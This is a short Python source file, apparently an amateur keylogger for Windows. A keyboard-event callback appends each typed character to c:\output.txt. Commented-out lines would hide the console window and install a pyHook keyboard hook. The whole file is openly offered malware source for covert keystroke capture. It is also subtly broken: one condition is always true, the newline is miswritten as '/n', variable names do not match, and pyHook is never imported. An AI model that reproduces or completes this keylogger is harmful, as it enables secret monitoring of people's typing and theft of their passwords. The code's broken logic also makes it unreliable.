# Python code for keylogger
# to be used in powershell



import win32api
import win32console
import win32gui
import pythoncom

#win = win32console.GetConsoleWindow()
#win32gui.ShowWindow(win, 0)


def keylogger():
	pass

def OnKeyboardEvent(event):
	if event.Ascii==5:
		exit(1)
	if event.Ascii !=0 or 8:
	#open output.txt to read current keystrokes
		f = open('c:\\output.txt', 'r+')
		buffer = f.read()
		f.close()
	# open output.txt to write current + new keystrokes
		f = open('c:\\output.txt', 'w')
		keylogs = chr(event.Ascii)
		if event.Ascii == 13:
			keylogs = '/n'
		buffer += keylogs
		f.write(buffer)
		f.close()
# create a hook manager object
#m = pyHook.HookManager()
#hm.KeyDown = OnKeyboardEvent
# set the hook
#hm.HookKeyboard()
# wait forever
#pythoncom.PumpMessages()
